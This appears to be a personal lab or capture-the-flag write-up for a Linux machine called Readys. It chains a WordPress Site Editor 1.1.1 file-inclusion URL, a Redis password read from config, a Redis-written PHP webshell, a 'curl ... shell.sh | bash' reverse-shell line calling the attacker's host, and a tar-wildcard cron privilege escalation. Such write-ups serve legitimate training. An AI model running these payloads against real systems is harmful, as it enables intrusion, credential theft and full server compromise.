---
Alias: Readys
Date: 5/20/2022
Platform: Linux
Difficulty: Intermediate
Tags: #vunerablepluginSite-EditorVersion1 #LocalFileInclusion #redisConfigurationFilePathLocation #RedisWritePermissionFile #hacktricksRedisWebshell
Status: Finished
IP: 192.168.53.166 
---

# {{Readys}}


# Resolution summary
- Found a wordpress site on port 80
- Ran wpscan and found Site Editor 1.1.1 plugin which is vulnerable to a Local File Inclusion
- As redis is present on the target machine foud via nmap I googled redis config file location
- Ran the LFI with the redis config file location and found the password to login to redis
- Per Hacktricks website in order to attempt to gain a webshell we must know the path of the website folder
- Googled how to find web root directory config files in linux and found that information is located in redis conifig file: /etc/apache2/sites-available/000-default.conf
- Ran the LFI with the 000-default config file and found the location of the web root directory on the target machine
- Logged into redis
- Attempted to follow the steps from Hackricks to obtain a webshell but received an error and found I had no write permissions in the directory
- Googled "redis write permission file" and found /etc/systemd/system/redis.service obtained the information of which directories had read and write permissions
- Ran the LFI with the redis.service file and found we can write to "/etc/redis" and "/opt/redis-files"
- Followed the rest of the steps to obtain a webshell now that I knew which directory i had write permissions
- Obtained a webshell with command execution 
- Received a shell
- Ran Linpeas and found there was a script running every 3 minutes
- Found the script was running tar with a wildcard
- Googled "tar wildcard privilege escalation"
- Found a privilege escalation for tar wildcard 
- Performed the privilege escalation steps in the specified "/var/www/html" directory as the script showed it was in that specific directory
- Waited for the cronjob to run
- Typed sudo su and received a shell as root

## Improved skills
- redis enumeration
- tar wilcard privilege escalation

## Used tools
- nmap
- rustscan
- wpscan

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.53.166  --ulimit 5000                                                                   (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.53.166:22
Open 192.168.53.166:80
Open 192.168.53.166:6379
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 19:17 EDT
Initiating Ping Scan at 19:17
Scanning 192.168.53.166 [2 ports]
Completed Ping Scan at 19:17, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:17
Completed Parallel DNS resolution of 1 host. at 19:17, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:17
Scanning 192.168.53.166 [3 ports]
Discovered open port 22/tcp on 192.168.53.166
Discovered open port 80/tcp on 192.168.53.166
Discovered open port 6379/tcp on 192.168.53.166
Completed Connect Scan at 19:17, 0.08s elapsed (3 total ports)
Nmap scan report for 192.168.53.166
Host is up, received syn-ack (0.081s latency).
Scanned at 2022-05-11 19:17:51 EDT for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
6379/tcp open  redis   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds


nmap -sC -sV -p 22,80,6379 192.168.53.166                                                                   (master✱) 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 19:20 EDT
Nmap scan report for 192.168.53.166
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Readys &#8211; Just another WordPress site
|_http-generator: WordPress 5.7.2
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.16 seconds
```

Enumerated open TCP ports:
```bash
80
6379
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80 - HTTP 

#### -Navigated to targets IP address and found the following webpage showing it is a WordPress site:

![](Images/Pasted%20image%2020221030121553.png)

#### -Typed "wpscan --update -e p --url http://192.168.53.166 " and found the following vulnerable plugin site-editor 1.1.1:

![](Images/Pasted%20image%2020221030121703.png)
#vunerablepluginSite-EditorVersion1 #LocalFileInclusion

#### -Googled site-editor 1.1.1 exploit and found the following LFI exploit for site-editor 1.1.1:

![](Images/Pasted%20image%2020221030122057.png)
![](Images/Pasted%20image%2020221030122124.png)

#### -Per the NMAP scan we know redis is present on the target machine. Googled "redis config location on linux" and found the following web page showing path location of "etc/redis/redis.conf":


![](Images/Pasted%20image%2020221030122212.png)
![](Images/Pasted%20image%2020221030122244.png)
#redisConfigurationFilePathLocation

#### -As instructed for LFI payload found previously I added "/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=" after the target IP address and added "/etc/redis/redis.conf". Typed "ctrl+f and pass" to find redis pass on the config file and found password "Ready4Redis?":

![](Images/Pasted%20image%2020221030122333.png)

## PORT 6379 - Redis

#### - Typed "redis-cli -h 192.168.230.166" and "AUTH Ready4Redis?" to login to redis:

![](Images/Pasted%20image%2020221031162257.png)

#### -Per Hacktricks website in order to attempt to gain a webshell we must know the path of the website folder:

![](Images/Pasted%20image%2020221031162348.png)

#### -Googled "how to find web root directory config files in linux" and found the following web page showing the path can be referenced in the "/etc/apache2/sites-available/000-default.conf" file:

![](Images/Pasted%20image%2020221031162436.png)
![](Images/Pasted%20image%2020221031162502.png)
#webrootdirectoryApacheConfigFile

#### -Navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/apache2/sites-enabled/000-default.conf" and was shown the web root directory of server is located in "/var/www/html":

![](Images/Pasted%20image%2020221031162551.png)

#### -Followed the steps in Hacktricks for Webshell but when attempting to save the file/config I received an error. We may not have write permissions on the directory

![](Images/Pasted%20image%2020221031162635.png)

#### -Googled "redis write permission file" and found mentioned file "/etc/systemd/system/redis.service":

![](Images/Pasted%20image%2020221031162703.png)
![](Images/Pasted%20image%2020221031162733.png)
#RedisWritePermissionFile

#### -Navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/systemd/system/redis.service" and found we can write to "/etc/redis" and "/opt/redis-files":

![](Images/Pasted%20image%2020221031163223.png)

#### -Typed the following when logged into the redis server and navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php" and found the "id" command was successful:

config set dir /opt/redis-files
config set dbfilename test.php
set test "<?php system('id'); ?>"

![](Images/Pasted%20image%2020221031163319.png)

![](Images/Pasted%20image%2020221031163356.png)
#hacktricksRedisWebshell

---

# Exploitation
## Redis Webshell

#### -Typed "vim shell.sh" on kali machine and typed the following into the "shell.sh":

![](Images/Pasted%20image%2020221101000321.png)

####  Started a penelope listener on kali machine

#### -Typed the following and navigated to "http://192.168.230.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php" and received a reverse shell:

config set dir /opt/redis-files
config set dbfilename test.php
set test "<?php system('curl 192.168.49.230/shell.sh | bash'); ?>"

![](Images/Pasted%20image%2020221101091609.png)
![](Images/Pasted%20image%2020221101091643.png)
![](Images/Pasted%20image%2020221101091725.png)

---


# Privilege Escalation
## Local Enumeration

#### -Ran linpeas.sh and found a script running every 3 minutes via crontab per the findings below:

![](Images/Pasted%20image%2020221101120654.png)

#### -Cat'd script "/usr/local/bin/backup.sh" and found the following showing it was running tar with a wildcard:

![](Images/Pasted%20image%2020221101120754.png)

#### -Googled "tar wildcard privilege escalation" and found the follwoing web page showing the step to add commands to have the script add user alice to the sudoers list and to have alice run any command with sudo:

![](Images/Pasted%20image%2020221101120828.png)

![](Images/Pasted%20image%2020221101120854.png)
![](Images/Pasted%20image%2020221101120920.png)
#TarWildcardPrivilegeEscalation


## Privilege Escalation vector
## Tar Wildcard Privilege Escalation

#### -Followed all the steps in the "/var/www/html" directory. Waited a few minutes for the cronjob/script to run. Typed "sudo su" and received a root shell:

![](Images/Pasted%20image%2020221101121057.png)

---

